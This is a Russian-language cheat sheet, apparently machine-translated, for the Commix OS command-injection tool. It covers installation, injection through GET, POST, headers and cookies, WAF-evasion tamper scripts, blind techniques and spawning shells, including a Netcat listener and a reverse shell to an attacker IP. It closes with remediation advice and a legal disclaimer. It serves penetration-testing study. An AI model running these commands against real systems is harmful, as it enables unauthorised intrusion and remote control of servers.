<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💉 Commix — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║██║ ╚███╔╝ 
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║ ██╔██╗ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██╔╝ ██╗
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
       [COMM]and [I]njection E[X]ploiter - Automated OS Command Injection
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/Commix-Command_Injection-blue?style=for-the-badge" alt="Commix">
  <img src="https://img.shields.io/badge/Author-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Веб-безопасность">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="Лицензия GPLv3">
</p>

<p выравнивание="центр">
  <b>🌐 Автоматизированный инструмент, предназначенный для обнаружения и использования уязвимостей внедрения команд в веб-приложениях и создания интерактивных оболочек</b>
</p>

---

## 📋 Содержание

- [Обзор и примитив ввода команд](#-overview--the-command-injection-primitive)
- [Установка](#-установка)
- [Базовое сканирование уязвимостей](#-basic-vulnerability-scanning)
- [Внедрение различных элементов HTTP](#-injecting-различные-http-elements)
  - [GET параметры](#get-parameters)
  - [POST-данные (`--data`)](#post-data---данные)
  - [HTTP-заголовки и файлы cookie](#http-headers--cookies)
- [Порождение интерактивных и обратных оболочек](#-spawning-interactive--reverse-shells)
  - [Псевдо-Shell (`--os-shell`)](#pseudo-shell---os-shell)
  - [Native Reverse Shell (`--reverse-ip`)](#native-reverse-shell---reverse-ip)
- [Скрипты уклонения и взлома WAF (`--tamper`)](#-waf-evasion--tamper-scripts---tamper)
- [Слепые методы на основе файлов и времени](#-на основе файлов--слепые-методы на основе времени)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и исправление](#-защитные-соображения--восстановление)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и примитив внедрения команд

В то время как **SQLMap** автоматизирует внедрение SQL, **Commix** (созданный **Анастасиосом Стасинопулосом**) является золотым стандартом для поиска и использования недостатков **Внедрения команд ОС**.

Когда веб-приложения небезопасно передают пользовательские данные непосредственно исполняющим функциям операционной системы (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec()`), злоумышленники могут добавлять произвольные команды оболочки. Commix автоматически определяет векторы внедрения на основе результатов, результатов, времени и файлов.

---

## 📥 Установка
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y commix

# Clone from GitHub (Latest Version)
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```
---

## 🚀 Базовое сканирование уязвимостей
```bash
# Scan a URL with GET parameters
commix -u "http://target.local/status.php?addr=127.0.0.1"

# Automatically answer Yes to all interactive prompts (Batch mode)
commix -u "http://target.local/ping.php?host=localhost" --batch
```
---

## 🔍 Внедрение различных элементов HTTP

### ПОЛУЧИТЬ параметры
Используйте тег `INJECT_HERE`, если существует несколько параметров:
```bash
commix -u "http://target.local/view.php?page=INJECT_HERE&user=admin"
```
### POST-данные (`--data`)
```bash
# Test POST body parameters
commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"

# Replay an HTTP request captured directly in Burp Suite
commix -r request.req
```
### HTTP-заголовки и файлы cookie
```bash
# Test User-Agent header for command injection
commix -u "http://target.local/index.php" --user-agent="test" --level=3

# Inject through authenticated session cookies
commix -u "http://target.local/admin.php" --cookie="PHPSESSID=abc123xyz"
```
---

## 💀 Создание интерактивных и обратных оболочек

### Псевдо-оболочка (`--os-shell`)

Когда инъекция подтверждена, Commix предоставляет эмулируемый псевдотерминал непосредственно в консоли:
```bash
commix -u "http://target.local/ping.php?ip=127.0.0.1" --os-shell
```
### Собственная обратная оболочка (`--reverse-ip`)

Попросите Commix отключить полное интерактивное обратное TCP-соединение обратно к вашему прослушивателю Netcat:
```bash
# 1. Start a Netcat listener on your machine
nc -lvnp 4444

# 2. Trigger native reverse shell via Commix
commix -u "http://target.local/ping.php?ip=127.0.0.1" \
  --reverse-ip=10.10.14.5 --reverse-port=4444
```
---

## 🥷 Скрипты уклонения и взлома WAF (`--tamper`)

Обход брандмауэров веб-приложений (WAF) и черных списков строк с помощью встроенной функции обфускации:
```bash
# List available tamper scripts
commix --list-tampers

# Use IFS whitespace bypass (replaces spaces with ${IFS})
commix -u "http://target.local/exec.php?cmd=test" --tamper=space2ifs

# Hex encode all injection strings
commix -u "http://target.local/exec.php?cmd=test" --tamper=hexencode
```
---

## ⏱️ Техники слепого управления на основе файлов и времени

Если вывод не отображается обратно в ответ HTTP:
```bash
# Force Time-Based Blind evaluation
commix -u "http://target.local/blind.php?id=1" --technique=T

# Force File-Based injection (writes command output to web root /tmp/)
commix -u "http://target.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
```
---

## ⚡ Краткая справочная таблица

| Цель | Команда |
|-----------|---------|
| **Сканировать параметр GET** | `commix -u "<URL>?param=val"` |
| **Сканировать параметры POST** | `commix -u "<URL>" --data="param=val"` |
| **Пакетное неинтерактивное сканирование** | `commix -u "<URL>" --batch` |
| **Интерактивная оболочка терминала**| `commix -u "<URL>" --os-shell` |
| **Отбросить обратную оболочку** | `commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>` |
| **Повторить запрос Burp** | `commix -r burp_request.req` |
| **Использовать тампер пространства** | `commix -u "<URL>" --tamper=space2ifs` |
| **Выполнить одну команду** | `commix -u "<URL>" --os-cmd="whoami; id"` |

---

## 🛡️ Соображения по поводу защиты и исправления

1. **Избегайте выполнения оболочки ОС.** Никогда не объединяйте несанкционированные пользовательские вводы в `system()`, `exec()` или команды оболочки.
2. **Используйте API-интерфейсы собственного языка.** Замените системные утилиты собственными библиотеками языков программирования (например, используйте библиотеку `socket` Python вместо запуска двоичного файла системы `ping`).
3. **Строгий белый список.** Если пользовательский ввод должен определять выполнение программы, перед вызовом проверяйте ввод на соответствие строгому буквенно-цифровому белому списку.

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> Commix автоматизирует выполнение произвольных команд на целевых серверах. Фаззинг или использование неавторизованных веб-приложений является незаконным. Используйте только в системах, где у вас есть явное письменное разрешение.